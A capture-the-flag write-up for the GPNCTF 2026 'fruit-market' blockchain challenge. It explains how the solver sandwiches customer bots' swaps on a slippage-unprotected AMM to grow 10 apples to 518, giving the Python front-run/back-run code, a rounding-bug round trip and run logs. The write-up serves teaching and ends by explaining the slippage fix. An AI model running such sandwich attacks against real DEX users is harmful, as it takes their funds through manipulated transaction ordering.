# fruit-market

- **CTF:** GPNCTF 2026
- **Category:** Misc (it's a blockchain chall wearing a Misc trenchcoat)
- **Author:** tamedfox
- **Flag:** `GPNCTF{l0ok_M4m4_1_GO7_s0m3_fruI75_At_My_joB}`

> We are hiring a trade transaction coordinator (m/f/x) for our bleeding-edge fruit market — our blockchain market place enables the fastest and safest way for trading fruits in town! As our trade transaction coordinator, you take trades from our customers and execute them on-chain before they expire. Your neutrality towards all customers makes our market the ultimate choice for all professional fruit dealers.

That last sentence is the whole challenge, by the way. Hold that thought.

## TL;DR

You're the guy who decides the order transactions hit the chain (you *are* the mempool), the customer bots broadcast their signed swaps to you in advance, and the DEX has zero slippage protection. So you sandwich every customer who sells apples, compound the proceeds, and walk 10 🍎 up to 500 🍎. Job's a good'un.

## What's in the box

The takeout tarball has three relevant chunks:

- `eth/MiniDex.sol` + `eth/ERCFixed.sol` — a constant-product AMM and a vanilla OpenZeppelin ERC20.
- `python/{main,trader,utils}.py` — a Flask app that spins up an `anvil` node, deploys everything, and runs three trading bots.
- `html/` — the operator panel (Bootstrap + Socket.IO). Mostly a distraction, but it does confirm the intended flow.

Three fruit tokens — APL 🍎, BAN 🍌, CHY 🍒 — each minting **1000** base units (note: no decimals scaling in play, everything is tiny integers, which matters later). Three pools:

```
APL-BAN : 100 APL / 200 BAN
BAN-CHY : 100 BAN / 200 CHY
APL-CHY : 100 APL / 400 CHY
```

Three customer bots (`Trader`) seeded with apples/bananas/cherries. Their strategy, verbatim from `trader.py`:

```python
# Ultimate Trading Strategy:
# Take what you have most of, and swap it with something else!
balance = self.balance()
trade_token = max(balance, key=balance.get)
trade_amount = max(int(balance[trade_token] * 0.5), 1)
```

So they dump half of whatever they're heaviest in. Bot A starts with 400 APL, i.e. it's gonna be selling apples for a while. File that away.

The win condition, from `main.py`:

```python
@app.get("/flag")
def flag():
    if balance_erc(ETH_SETUP['ercs']['APL'], MANAGER) >= 500:
        return "Wow! Here is your flag:\n" + os.environ.get('FLAG', ...)
```

500 APL. There are only 1000 in existence — 790 across the bots, 200 in pools, 10 left over (which the fruit basket hands to you). So "earn" half the apple supply.

## The endpoints

- `GET /setup` — token + dex addresses.
- `POST /fruit-basket` — registers your address as `MANAGER` and gives you 10 APL + a pile of ETH. **One-shot**, globally. Call it twice and you get `403 already claimed`.
- `GET /open` — starts the bot worker thread.
- `POST /submit` — takes a raw signed tx and `send_raw_transaction`s it. This is how trades reach the chain.
- `POST /` — a JSON-RPC proxy, but with an allowlist (`SAFE_METHODS`): only read methods. `eth_sendRawTransaction` is **not** in it.
- `socket.io` `new_trade` — each bot's `(approve, swap, swap_hash)` gets emitted to every connected client.

And here's the thing the worker actually does:

```python
txs = t.next()
if txs is not None:
    socketio.emit('new_trade', { 'approve': ..., 'swap': ..., 'swap_hash': ... })
```

It **emits** the signed transactions. It does not submit them. Nobody submits them but you. The chain literally does not move unless the coordinator (you) relays the bytes through `/submit`.

So you have:
1. full advance knowledge of every trade, signed and ready,
2. total control over ordering and inclusion,
3. and the ability to inject your own transactions wherever you like.

That's not a mempool with an MEV problem. That's *being* the MEV.

## Dead ends I burned an hour on first

Because of course I didn't see it immediately.

**Reentrancy.** `MiniDex` extends `ReentrancyGuard` and `swap` is `nonReentrant`. The tokens are stock OZ ERC20 with no transfer hooks. There's no callback surface. Nope.

**Replaying the bots' signed txs.** You get their fully-signed `approve`+`swap` over the socket — can you just... resubmit them for profit? No. They're bound to the bot's nonce and `msg.sender`; `transferFrom` pulls *their* tokens to *them*. Replaying just re-runs their own trade. Useless to me.

**Abusing the RPC proxy.** I really wanted `anvil_setBalance` (it's used in `utils.give_money`) or a raw `eth_sendRawTransaction` through `POST /`. Both blocked — `SAFE_METHODS` is read-only. You're forced through `/submit` for any state change, which (annoyingly at first, then beautifully) is the whole point.

**The rounding bug, solo.** This one's real and worth describing because it almost looks like the intended path. `getAmountOut` does:

```solidity
uint256 newOutputReserve = (inputReserve * outputReserve) / newInputReserve; // floor
outputAmount = outputReserve - newOutputReserve;
```

Flooring `newOutputReserve` *before* subtracting means the output is rounded **up** in the trader's favor — there's no fee to absorb it, so `k` actually shrinks on every swap. A round trip on APL-CHY:

```
swap 10 APL -> 37 CHY    (pool 100/400 -> 110/363)
swap 37 CHY -> 11 APL    (pool 110/363 -> 99/400)
```

You put in 10 APL, you get out 11. Free apple, every loop, no bots required. Cute! But the APL-CHY pool only holds 100 apples and the gain is ~1 per loop and it tapers as you drain it. You are not grinding to 500 apples one rounding error at a time before the heat death of the universe. Dead path — but it's the same no-fee/no-protection sloppiness that makes the real attack work, so it's a good tell.

## The actual bug

`swap` has a deadline and a `require(outputAmount > 0)`. That's it. **No `minAmountOut`.** No slippage protection whatsoever.

Combine that with "you control ordering and see trades in advance" and you've got the cleanest sandwich setup imaginable. For any bot that's *selling APL* into a pool:

1. **Front-run** — sell all *your* APL into that pool first. Tanks the APL price.
2. **Relay the victim** — their APL→token swap executes at the garbage price you just created. They have no `minOut` to bail them out, so they eat it. The pool fills with cheap apples.
3. **Back-run** — sell everything back. You scoop the underpriced apples.

Their slippage is your profit, denominated in apples, which is exactly the token you need. And it compounds, because next round your front-run is bigger.

The "your neutrality towards all customers" line in the description is the author straight-up telling you the assumption — and that nothing enforces it.

### Does the math actually reach 500?

I reimplemented `getAmountOut` in plain Python (it's just integer arithmetic) and ran the whole thing — three pools, three bots on their real strategy, me sandwiching every APL sale with an optimal front-run size. One sandwich of the first 200-APL dump:

```
pool 100/400, I hold 10 APL
front-run 10 APL -> 37 CHY     pool 110/363
victim 200 APL -> 235 CHY      pool 310/128
back-run 37 CHY -> 70 APL      pool 240/165
=> 10 APL became 70 APL
```

From there it snowballs. The sim hit 500+ in ~4 sandwiched apple-sales. Because the pool only changes when *I* submit, there's no race at all: I can read live reserves via the proxy, brute-force the front-run amount that maximizes my final APL, then fire. Deterministic.

## The script

A few practical notes that bit me:

- **Reads** go through the proxy (`web3` pointed at `POST /` — `eth_call`, `eth_getTransactionCount`, `eth_gasPrice`, etc. are all allowlisted). **Writes** get signed locally and shipped via `POST /submit`. Don't try to `send_raw_transaction` through web3; it's not in `SAFE_METHODS`.
- Pre-approve every dex to spend both your tokens once at the start (max allowance), so each swap is a single tx and the ordering stays tidy.
- The bots' emitted hex has no `0x` prefix; `recover_transaction` doesn't care, but strip/normalize anyway.
- Decode the victim's `swap` to learn `(amount, inputToken)`. I just RLP-decode the raw tx myself: for an EIP-2718 typed envelope, `to = fields[5]`, `data = fields[7]`; calldata is `selector(4) || amount(32) || token(32) || deadline(32)`. `swap(uint256,address,uint256)` selector is `0x43264349`.
- Guard the socket handler with a lock so sandwiches don't interleave and scramble your nonces.

Core of it:

```python
def handle_trade(payload):
    to, data = decode_to_data(payload["swap"])
    if data[:4] != SWAP_SELECTOR: return
    in_amt   = int.from_bytes(data[4:36], "big")
    in_token = Web3.to_checksum_address(data[36:68][-20:])

    if in_token != APL:
        submit(payload["approve"]); submit(payload["swap"])   # stay "neutral", relay it
        return

    # APL is being sold into pool `d` -> sandwich
    rA, rB = dex[d].functions.getReserves().call()
    apl_res, tgt_res = (rA, rB) if token_a == APL else (rB, rA)
    f, _ = best_frontrun(apl_res, tgt_res, in_amt, apl_balance())   # search 0..myAPL

    if f: send_my_call(dex[d], "swap", [f, APL, FAR], 200_000)      # 1. front-run
    submit(payload["approve"]); submit(payload["swap"])             # 2. victim
    tgt = bal(target)
    if tgt: send_my_call(dex[d], "swap", [tgt, target, FAR], 200_000)  # 3. back-run
    try_flag()
```

`best_frontrun` just simulates the three-leg sandwich for every front-run size from 0 to my current APL and picks the one that leaves me richest — since amounts are tiny ints, the brute force is instant and guarantees I never accidentally take a loss when the pool's too shallow.

## Run

```
$ python3 live.py https://...gpn24.ctf.kitctf.de
[*] manager  : 0x5CC5F37a...
[*] fruit-basket: 200 'OK'
[*] starting APL balance: 10
[trade] victim sells 200 APL ...  =>  my APL = 70
[trade] victim sells 150 APL ...  =>  my APL = 206
[trade] victim sells 160 APL ...  =>  my APL = 362
[trade] victim sells  75 APL ...  =>  my APL = 436
[trade] victim sells  80 APL ...  =>  my APL = 518
============================================================
[+] Wow! Here is your flag:
GPNCTF{l0ok_M4m4_1_GO7_s0m3_fruI75_At_My_joB}
============================================================
```

Five sandwiches, 10 → 518. Bot A obligingly kept dumping apples right into the wood chipper.

## Takeaway

The bug isn't in any one line of Solidity — `MiniDex` is just a slightly-sloppy textbook AMM. The bug is the *trust model*: a swap with no `minAmountOut` is safe only if the party choosing transaction order is honest, and this challenge hands that role to the attacker and then writes "your neutrality is what makes us great" on the wall. Real MEV is exactly this, minus the fruit emojis. Add slippage protection and the whole thing falls apart — your front-run would push the price past the customer's `minOut` and their swap would revert instead of feeding you.
